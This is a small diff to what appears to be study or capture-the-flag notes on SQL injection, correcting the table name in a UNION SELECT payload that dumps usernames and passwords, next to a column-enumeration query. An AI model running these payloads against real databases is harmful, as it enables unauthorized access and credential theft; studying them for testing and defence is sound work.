@@ -67,7 +67,7 @@ Steps
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'ucstaff_users'
 
 - Look for data we want, typically username and password
-0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM ucstaff_users
 
 #### Blind SQL injection
 ##### Authentication Bypass
